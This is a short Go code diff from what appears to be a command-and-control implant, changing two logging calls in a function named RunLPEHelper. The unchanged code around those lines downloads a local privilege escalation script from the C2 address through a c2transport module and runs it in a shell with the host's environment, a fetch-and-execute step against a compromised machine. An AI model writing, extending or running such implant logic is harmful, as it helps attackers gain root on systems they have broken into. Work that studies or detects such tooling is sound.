@@ -16,7 +16,7 @@ import (
 
 // RunLPEHelper runs helper scripts to give you hints on how to escalate privilege
 func RunLPEHelper(method, checksum string) (out string) {
-	logging.Printf("Downloading LPE script from %s", def.CCAddress+method)
+	logging.Infof("Downloading LPE script from %s", def.CCAddress+method)
 	var scriptData []byte
 	scriptData, err := c2transport.FetchFile(common.RuntimeConfig, "", "getroot", "", "")
 	if err != nil {
@@ -24,7 +24,7 @@ func RunLPEHelper(method, checksum string) (out string) {
 	}
 
 	// run the script
-	logging.Printf("Running LPE helper %s", method)
+	logging.Infof("Running LPE helper %s", method)
 	out, err = agentutils.ExecuteShell(scriptData, nil, os.Environ())
 	if err != nil {
 		return logging.Sprintf("Run LPE helper %s failed: %s %v", method, out, err)
